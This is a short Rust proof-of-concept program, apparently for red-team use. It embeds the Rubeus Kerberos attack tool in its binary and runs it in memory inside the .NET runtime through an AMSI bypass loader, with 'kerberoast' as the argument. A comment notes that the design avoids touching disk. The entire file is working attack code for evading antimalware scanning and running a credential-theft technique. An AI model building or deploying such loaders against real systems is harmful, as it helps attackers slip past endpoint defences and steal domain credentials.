use clroxide::clr::Clr;
use clroxide::primitives::AmsiBypassLoader;

// Rubeus464.exe embedé directement dans le binaire — aucun accès disque au runtime
static RUBEUS_BYTES: &[u8] = include_bytes!("../Rubeus464.exe");

fn execute_assembly(assembly: Vec<u8>, args: Vec<String>) -> String {
    println!(
        "[*] execute_assembly: {} bytes, args: {:?}",
        assembly.len(),
        args
    );

    let mut bypass_loader = AmsiBypassLoader::new();

    let mut clr = match Clr::new(assembly, args) {
        Ok(c) => c,
        Err(e) => return format!("[-] Error creating CLR: {}", e),
    };

    match clr.run_with_amsi_bypass_auto(&mut bypass_loader) {
        Ok(output) => output,
        Err(e) => format!("[-] Error running CLR (load2): {}", e),
    }
}

fn main() {
    //args rubeus
    let rubeus_args: Vec<String> = vec!["kerberoast".to_string(), "/stats".to_string()];

    println!("[*] ClrOxide PoC - Rubeus464.exe via AMSI bypass (Load_2)");
    println!("[*] Assembly size: {} bytes", RUBEUS_BYTES.len());
    println!("[*] Args: {:?}", rubeus_args);
    println!("---");

    let output = execute_assembly(RUBEUS_BYTES.to_vec(), rubeus_args);

    println!("{}", output);

    //wait for user input
    println!("Press Enter to exit...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}
